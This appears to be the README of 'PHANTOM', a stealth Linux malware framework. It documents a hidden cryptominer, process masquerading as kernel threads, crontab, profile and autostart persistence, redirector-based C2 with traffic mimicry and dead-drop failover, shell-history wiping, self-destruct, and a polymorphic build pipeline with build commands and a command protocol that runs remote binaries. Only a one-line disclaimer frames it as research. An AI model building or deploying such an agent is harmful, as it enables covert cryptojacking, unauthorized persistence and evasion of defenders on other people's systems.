# PHANTOM FRAMEWORK — Revised Operational Architecture

## Overview
**PHANTOM** is a high-stealth, polymorphic Linux agent designed for long-term persistence, adaptive resource usage, and robust C2 communication in hardened environments. It leverages reflective loading, process masquerading, and anti-forensics to operate undetected.

This release transitions from legacy domain fronting to a modern, disposable redirector architecture with JA3 fingerprint randomization and certificate pinning.

## Network Topology

```
 ┌──────────────────┐
 │  Target Server   │  (unprivileged user)
 │  ┌─────────────┐ │
 │  │  phantom     │──── HTTPS/TLS 1.3 (JA3 mimicked) ────┐
 │  │  (agent)     │ │                                      │
 │  └──────┬──────┘ │                                      ▼
 │         │        │                          ┌────────────────────┐
 │  ┌──────▼──────┐ │                          │   REDIRECTOR       │
 │  │  xmrig      │ │                          │ (CF Worker / AWS   │
 │  │  (memfd)    │ │                          │  API Gateway)      │
 │  │  ↕ lo:19228 │ │                          └────────┬───────────┘
 │  └─────────────┘ │                                   │
 └──────────────────┘                                   │ HTTPS (forwarded)
                                                        ▼
                                               ┌────────────────────┐
                                               │    C2 SERVER       │
                                               │    (VPS #1)        │
                                               │  - Agent mgmt      │
                                               │  - Payload host    │
                                               │  - Stratum relay   │
                                               └────────┬───────────┘
```

## Key Capabilities

### 1. Process Masquerade
- **Technique:** `prctl(PR_SET_NAME)` + `argv[0]` rewriting + `/proc/self/comm` overwrite.
- **Effect:** The process appears as a kernel worker (e.g., `[kworker/u8:3]`) or a system daemon in `ps`, `top`, and `htop`.
- **Environment:** Restores `PATH` and `HOME` internally to ensure child processes (persistence) function correctly despite memory overwrites.

### 2. Adaptive Resource Governor
- **Mechanism:** Monitors system load via `/proc/stat`.
- **Policy:** If CPU usage exceeds `max_cpu_pct` (configurable), the payload (miner) is paused via `SIGSTOP`. Resumes with `SIGCONT` when load drops.
- **Stealth:** Prevents load spikes that trigger monitoring alerts.

### 3. Persistence Triad
Redundant user-level persistence mechanisms:
1.  **Crontab:** Injects a hidden entry into the user's crontab.
2.  **Profile Hook:** Appends a background execution line to `~/.profile`.
3.  **XDG Autostart:** Creates a hidden `.desktop` file in `~/.config/autostart`.

### 4. Communications Security
- **JA3 Mimicry:** Custom OpenSSL cipher suite ordering to simulate Firefox/Chrome traffic.
- **Certificate Pinning:** Validates the SHA-256 fingerprint of the C2 leaf certificate to prevent MITM.
- **Dead Drop Resolution:** Fails over to DNS TXT records or Paste sites if the primary C2 is unreachable.

### 5. Anti-Forensics
- **Log Suppression:** Unsets `HISTFILE`, truncates `.bash_history` and other shell history files.
- **Self-Destruct (Scorched Earth):** Overwrites the binary with junk data before unlinking. Removes all persistence hooks.
- **Polymorphism:** `morph.py` generates a unique binary for every build (randomized function names, dead code injection, unique encryption keys).

---

## Build & Deployment

### Prerequisites
- Linux x86_64 host
- Python 3.x
- `gcc`, `make`, `curl`

### 1. Prepare Environment
Run the dependency builder to compile static `musl-libc`, `openssl`, and `curl` libraries.
```bash
chmod +x build_deps.sh
./build_deps.sh
```
*Note: This builds a self-contained toolchain in `$HOME/musl`.*

### 2. Generate C2 Certificate
Create a self-signed certificate (or use a real one) and save the DER format.
```bash
openssl req -x509 -newkey rsa:4096 -keyout c2_key.pem -out c2_cert.pem -days 365 -nodes -subj "/CN=cdn.example.com"
openssl x509 -outform der -in c2_cert.pem -out c2_cert.der
```

### 3. Configure & Compile Agent
Edit the configuration in `morph.py`:
```python
agent_config = {
    'c2_url': 'https://your-redirector.workers.dev/api',
    'c2_fallback_dns': 'fallback.example.com',
    ...
}
```

Run the mutation engine to generate the agent binary:
```bash
# Ensure CC points to the musl wrapper
export CC="$HOME/musl/bin/musl-gcc"
python3 morph.py agent_bin
```

### 4. Verify
```bash
file agent_bin
# agent_bin: ELF 64-bit LSB pie executable, x86-64, static-pie linked, stripped
```

---

## C2 Protocol Specification

The agent sends a heartbeat POST request to the C2 URL.

**Request:**
```json
{
  "id": "agent_id_hash",
  "up": 12345,       // Uptime in seconds
  "load": 0.15,      // 1-minute load average
  "mp": 1            // Miner process status (0=stopped, 1=running)
}
```

**Response:**
The C2 should verify the agent ID and respond with a single byte command, optionally followed by a payload.
- `0x00`: No Operation (Sleep)
- `0x01`: Execute Payload (Followed by ELF binary bytes)
- `0x04`: Kill Miner
- `0x05`: Scorched Earth (Self-Destruct)

---

## Legal & Disclaimer
This software is for educational purposes and authorized security research only. Misuse of this software for malicious purposes is illegal.
